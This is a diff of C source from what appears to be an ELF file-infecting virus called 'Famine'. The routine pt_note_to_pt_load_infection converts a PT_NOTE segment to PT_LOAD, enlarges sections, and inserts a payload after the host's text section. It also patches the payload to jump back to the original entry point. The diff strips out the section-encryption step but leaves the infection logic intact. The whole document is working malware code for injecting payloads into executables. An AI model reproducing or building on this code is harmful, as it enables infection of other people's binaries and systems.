@@ -56,17 +56,6 @@ void pt_note_to_pt_load_infection(t_famine *famine)
         {
             famine->shdr[i].sh_size += famine->payload_size;
         }
-        // get section to encrypt info.
-        if (!strncmp(SECTION_TO_ENCRYPT_NAME,
-                     (famine->string_table_ptr + famine->shdr[i].sh_name),
-                     strlen(SECTION_TO_ENCRYPT_NAME)))
-        {
-            famine->encrypt_s_start_offset = famine->shdr[i].sh_offset;
-            famine->encrypt_s_size = famine->shdr[i].sh_size;
-            famine->encrypt_s_end_offset = famine->encrypt_s_start_offset + famine->encrypt_s_size;
-            famine->encrypt_s_addr = famine->shdr[i].sh_addr;
-            famine->shdr[i].sh_flags |= SHF_WRITE;
-        }
     }
 
     // Increase section header offset by PAGE_SIZE
@@ -79,18 +68,11 @@ void pt_note_to_pt_load_infection(t_famine *famine)
     }
     else if (famine->elf_64)
     {
-        overwrite_keysection_payload(famine);
-        overwrite_payload_getencryptedsectionaddr(famine);
         overwrite_payload_ret2oep(famine);
-        overwrite_payload_getencryptedsectionsize(famine);
-        overwrite_payload_gettextsectionaddr(famine);
-        overwrite_payload_gettextsize(famine);
     }
 
     // Copy until text section end
     memcpy(famine->infected_file, famine->mmap_ptr, famine->text_p_end_offset);
-    // Rewrite text section with cipher data.
-    memcpy(famine->infected_file + famine->encrypt_s_start_offset, famine->cipher, famine->encrypt_s_size);
     // Initialize value to zero for padding.
     bzero(famine->infected_file + famine->text_p_end_offset, PAGE_SIZE);
     // Insert payload after text section end
